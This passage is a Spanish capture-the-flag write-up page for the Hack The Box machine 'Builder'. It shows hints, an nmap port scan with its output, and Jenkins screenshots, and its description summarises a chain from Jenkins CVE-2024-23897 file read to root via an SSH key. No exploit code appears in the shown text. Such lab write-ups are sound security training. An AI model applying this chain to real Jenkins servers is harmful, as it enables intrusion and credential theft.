@@ -1,0 +1,1485 @@
+<!doctype html>
+<html
+  lang="es"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="es">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HTB - Builder &middot; Fluwhen</title>
+    <meta name="title" content="HTB - Builder &middot; Fluwhen">
+  
+
+  
+  
+  
+  
+  
+    
+  
+    
+  
+    
+  
+  
+    <meta name="description" content="Builder is a medium-difficulty Linux machine that features a Jenkins instance. The Jenkins instance is found to be vulnerable to the CVE-2024-23897 vulnerability that allows unauthenticated users to read arbitrary files on the Jenkins controller file system. An attacker is able to extract the username and password hash of the Jenkins user jennifer. Using the credentials to login into the remote Jenkins instance, an encrypted SSH key is exploited to obtain root access on the host machine.">
+  
+  
+    <meta name="keywords" content="HackTheBox,Linux,">
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/writeupps/htb-builder/">
+  
+  
+
+  
+  
+    <meta name="author" content="Fluwhen">
+  
+  
+
+  
+  <meta property="og:url" content="//localhost:1313/writeupps/htb-builder/">
+  <meta property="og:site_name" content="Fluwhen">
+  <meta property="og:title" content="HTB - Builder">
+  <meta property="og:description" content="Builder is a medium-difficulty Linux machine that features a Jenkins instance. The Jenkins instance is found to be vulnerable to the CVE-2024-23897 vulnerability that allows unauthenticated users to read arbitrary files on the Jenkins controller file system. An attacker is able to extract the username and password hash of the Jenkins user jennifer. Using the credentials to login into the remote Jenkins instance, an encrypted SSH key is exploited to obtain root access on the host machine.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeupps">
+    <meta property="article:published_time" content="2026-09-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-09-24T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Linux">
+    <meta property="og:image" content="//localhost:1313/writeupps/htb-builder/feature.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/writeupps/htb-builder/feature.png">
+  <meta name="twitter:title" content="HTB - Builder">
+  <meta name="twitter:description" content="Builder is a medium-difficulty Linux machine that features a Jenkins instance. The Jenkins instance is found to be vulnerable to the CVE-2024-23897 vulnerability that allows unauthenticated users to read arbitrary files on the Jenkins controller file system. An attacker is able to extract the username and password hash of the Jenkins user jennifer. Using the credentials to login into the remote Jenkins instance, an encrypted SSH key is exploited to obtain root access on the host machine.">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+      
+    
+  
+    
+      
+    
+  
+  
+    
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.08e128dd0b63b89e7bf1fd6ac2206797fd2bbeafd9fc83c4b8defa0185a22f1e69160b0e20baaa5b2a97d4a3e5d6736244dcac839e311058dcc1abcee4ca1150.css"
+    integrity="sha512-COEo3QtjuJ578f1qwiBnl/0rvq/Z/IPEuN76AYWiLx5pFgsOILqqWyqX1KPl1nNiRNysg54xEFjcwavO5MoRUA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.20c0df9d0135e3169f5efa2324d182120b3c04dc95fa7a0e56ff0dd9bc25f32b13ca5cca43a34b1f323c4eed789f01e3359bcc182c8c5580a4a2eca80cf89ddf.js"
+    integrity="sha512-IMDfnQE14xafXvojJNGCEgs8BNyV&#43;noOVv8N2bwl8ysTylzKQ6NLHzI8Tu14nwHjNZvMGCyMVYCkouyoDPid3w=="></script>
+  
+
+
+  
+  
+  
+  
+  
+    
+    <script
+      type="text/javascript"
+      src="/js/zen-mode.min.9814dee9614d32aeb56239d118edfe20acd6231424f9b19c2dd48835038414130a5e946c0d1c9087d60e60e31840c9babfd217e3d4b95643dc8d651a71ccdf4a.js"
+      integrity="sha512-mBTe6WFNMq61YjnRGO3&#43;IKzWIxQk&#43;bGcLdSINQOEFBMKXpRsDRyQh9YOYOMYQMm6v9IX49S5VkPcjWUacczfSg=="></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+    
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.f3992c569c1b7c43290593e29307cd86e34c6feee9d9a8905351b0981dda69c7f178bc2f6483874e0d7ab78923d226b97453c9939a7ecc3073d1a4134ac09732.js"
+      integrity="sha512-85ksVpwbfEMpBZPikwfNhuNMb&#43;7p2aiQU1GwmB3aacfxeLwvZIOHTg16t4kj0ia5dFPJk5p&#43;zDBz0aQTSsCXMg=="
+      data-copy="Copiar"
+      data-copied="Copiado"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "writeupps",
+    "name": "HTB - Builder",
+    "headline": "HTB - Builder",
+    
+    "inLanguage": "es",
+    "url" : "//localhost:1313/writeupps/htb-builder/",
+    "author" : {
+      "@type": "Person",
+      "name": "Fluwhen",
+      "image": "//localhost:1313/img/profile-city-pop-cat-glasses.png"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-09-24T00:00:00\u002b00:00",
+    "datePublished": "2026-09-24T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-09-24T00:00:00\u002b00:00",
+    
+    "keywords": ["HackTheBox","Linux"],
+    
+    "mainEntityOfPage": "//localhost:1313/writeupps/htb-builder/",
+    "wordCount": "1258"
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Ir al contenido
+      </a>
+    </div>
+    
+    
+      <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 z-100">
+  <div
+    id="menu-blur"
+    class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl shadow-2xl bg-neutral/25 dark:bg-neutral-800/25"></div>
+  <div class="relative m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32">
+    <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      Fluwhen
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/writeupps/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="writeupps"
+      title="writeupps">
+      
+      
+        <span class="text-base font-medium break-normal">
+          writeupps
+        </span>
+      
+    </a>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/writeupps/"
+        aria-label="writeupps"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+        <span title="writeupps" class="text-2xl font-bold tracking-tight">
+          writeupps
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+
+
+<script
+  type="text/javascript"
+  src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+  integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+  data-blur-id="menu-blur"></script>
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/writeupps/htb-builder/background_hu_3a90a10177eb03d2.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/writeupps/htb-builder/background_hu_3a90a10177eb03d2.jpg"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >jaaa</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeupps/"
+      >writeupps</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeupps/htb-builder/"
+      >HTB - Builder</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB - Builder
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-09-24T00:00:00&#43;00:00">24 septiembre 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">6 mins</span><span class="px-2 text-primary-500">&middot;</span><span class="mb-[2px]">
+  <span
+    id="zen-mode-button"
+    class="text-lg hover:text-primary-500"
+    title="Activar modo zen"
+    data-title-i18n-disable="Activar modo zen"
+    data-title-i18n-enable="Desactivar modo zen">
+    <span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="50px" height="50px">
+    <path fill="currentColor" d="M 12.980469 4 C 9.1204688 4 5.9804688 7.14 5.9804688 11 L 6 26 L 9.9804688 26 L 9.9804688 11 C 9.9804688 9.35 11.320469 8 12.980469 8 L 40.019531 8 C 41.679531 8 43.019531 9.35 43.019531 11 L 43.019531 39 C 43.019531 40.65 41.679531 42 40.019531 42 L 29 42 C 29 43.54 28.420938 44.94 27.460938 46 L 40.019531 46 C 43.879531 46 47.019531 42.86 47.019531 39 L 47.019531 11 C 47.019531 7.14 43.879531 4 40.019531 4 L 12.980469 4 z M 7 28 C 4.794 28 3 29.794 3 32 L 3 42 C 3 44.206 4.794 46 7 46 L 23 46 C 25.206 46 27 44.206 27 42 L 27 32 C 27 29.794 25.206 28 23 28 L 7 28 z M 7 32 L 23 32 L 23.001953 42 L 7 42 L 7 32 z"/>
+</svg></span></span>
+  </span>
+</span>
+
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+    <div class="flex flex-row flex-wrap items-center">
+      
+        
+      
+        
+      
+        
+      
+        
+          
+            
+              
+            
+            
+              
+                <a class="relative mt-[0.5rem] me-2" href="/tags/hackthebox/">
+                  <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    HackTheBox
+  </span>
+</span>
+
+                </a>
+              
+            
+          
+            
+              
+            
+            
+              
+                <a class="relative mt-[0.5rem] me-2" href="/tags/linux/">
+                  <span class="flex cursor-pointer">
+  
+  
+  
+  
+    <span
+      class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+  
+    Linux
+  </span>
+</span>
+
+                </a>
+              
+            
+          
+        
+      
+    </div>
+  
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="Fluwhen"
+        src="/img/profile-city-pop-cat-glasses_hu_d2c06b2a6452b721.png"
+        data-zoom-src="/img/profile-city-pop-cat-glasses_hu_d5f9b12993864bef.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Autor
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Fluwhen
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">Offensive Cibersecurity Research</div>
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+        <div class="order-first lg:ms-auto px-0 lg:order-last lg:ps-8 lg:max-w-2xs">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-[140px]">
+            <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain bf-scrollbar rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#spoiler">Spoiler</a></li>
+    <li><a href="#writeupp">Writeupp</a>
+      <ul>
+        <li><a href="#reconocimiento">Reconocimiento</a></li>
+      </ul>
+    </li>
+    <li><a href="#acceso-inicial">Acceso Inicial</a></li>
+    <li><a href="#escalamiento-de-privilegios">Escalamiento de privilegios</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg -ms-5 ps-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Tabla de contenido
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#spoiler">Spoiler</a></li>
+    <li><a href="#writeupp">Writeupp</a>
+      <ul>
+        <li><a href="#reconocimiento">Reconocimiento</a></li>
+      </ul>
+    </li>
+    <li><a href="#acceso-inicial">Acceso Inicial</a></li>
+    <li><a href="#escalamiento-de-privilegios">Escalamiento de privilegios</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+
+
+          </div>
+        </div>
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+
+
+
+
+  
+  
+
+
+<section class="machine-htb" style="--machine-difficulty: #FFAF00;">
+  <header class="machine-htb__header">
+    <div>
+      <div class="machine-htb__eyebrow">Información de la máquina</div>
+      <div class="machine-htb__name">Builder</div>
+    </div>
+    <div class="machine-htb__platform">Hack The Box</div>
+  </header>
+  <div class="machine-htb__details">
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Dirección IP</div>
+      <div class="machine-htb__value machine-htb__value--mono">10.129.230.220</div>
+    </div>
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Sistema operativo</div>
+      <div class="machine-htb__value">Linux</div>
+    </div>
+    <div class="machine-htb__detail">
+      <div class="machine-htb__label">Dificultad</div>
+      <div class="machine-htb__value machine-htb__difficulty">● Medium</div>
+    </div>
+  </div>
+</section>
+
+
+<h2 class="relative group">Spoiler
+    <div id="spoiler" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#spoiler" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<hr>
+<style>
+  .spoiler-toggle {
+    position: absolute;
+    opacity: 0;
+    pointer-events: none;
+  }
+
+  .spoiler-text {
+    cursor: pointer;
+    filter: blur(6px);
+    opacity: 0.35;
+    transition: filter 0.2s ease, opacity 0.2s ease;
+  }
+
+  .spoiler-toggle:checked + .spoiler-text {
+    filter: none;
+    opacity: 1;
+    user-select: text;
+  }
+</style>
+<p>Hint 1:
+<input class="spoiler-toggle" type="checkbox" id="step-1">
+<label class="spoiler-text" for="step-1">
+Vulnerabilidades por versión, siempre funciona
+</label></p>
+<p>Hint 2:
+<input class="spoiler-toggle" type="checkbox" id="step-2">
+<label class="spoiler-text" for="step-2">
+La verdad, tomó algo de tiempo en búsqueda de información, así que mi consejo es que busques a la antigua, en stackoverflow
+</label></p>
+<p>Hint 3:
+<input class="spoiler-toggle" type="checkbox" id="step-3">
+<label class="spoiler-text" for="step-3">
+Siempre obten todas las credenciales que tienes, la llave esa del principio se puede obtener, solo es cuestión de búsqueda, no te rindas :)
+</label></p>
+
+<h2 class="relative group">Writeupp
+    <div id="writeupp" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#writeupp" aria-label="Ancla">#</a>
+    </span>
+    
+</h2>
+<hr>
+
+<h3 class="relative group">Reconocimiento
+    <div id="reconocimiento" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#reconocimiento" aria-label="Ancla">#</a>
+    </span>
+    
+</h3>
+<p>Primero se realizará el escaneo de puertos y servicios de la máquina utilizando la herramienta <code>nmap</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo nmap -sS -Pn -n --min-rate <span class="m">5000</span> 10.129.230.220 -p- -sV -vvv -oN port-scan</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">230</span><span class="o">.</span><span class="mi">220</span>
+</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="n">set</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">10</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="no">Scanned</span> <span class="n">at</span> <span class="mi">2026</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">26</span> <span class="mi">18</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">16</span> <span class="no">EDT</span> <span class="k">for</span> <span class="mi">23</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">65533</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">REASON</span>         <span class="no">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">63</span> <span class="no">OpenSSH</span> <span class="mi">8</span><span class="o">.</span><span class="mi">9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">6</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">62</span> <span class="no">Jetty</span> <span class="mi">10</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">18</span>
+</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kernel</span></span></span></code></pre></div></div>
+<p>Del escaneo tenemos 2 puertos, uno de ellos es una web ejecutándose en el puerto 8080 y otro es un SSH, empezaremos por la web a ver si encontramos una forma de ingresar al sistema, de manera adelantada <code>nmap</code> encontró que la web se ejecuta en un servicor web Jetty 10.0.18</p>
+<p>La web nos muestra que se está ejecutando un jenkins tal como se muestra en la siguiente imagen:</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1789"
+    height="562"
+    src="/writeupps/htb-builder/image_hu_270eb97eba49335.png"
+    srcset="/writeupps/htb-builder/image_hu_270eb97eba49335.png 800w, /writeupps/htb-builder/image_hu_83534134137afec4.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image.png"></figure>
+<p>En la parte inferior derecha podemos observar la versión del Jenkins</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="254"
+    height="123"
+    src="/writeupps/htb-builder/image-2.png"
+    srcset="/writeupps/htb-builder/image-2.png 800w, /writeupps/htb-builder/image-2.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/writeupps/htb-builder/image-2.png"></figure>
+<p>En la parte izquierda de la web nos permite acceder a la seccción <em>People</em> el cual nos arroja los usuarios que se tienen en el jenkins</p>
+<figure><img
+    class="my-0 rounded-md"
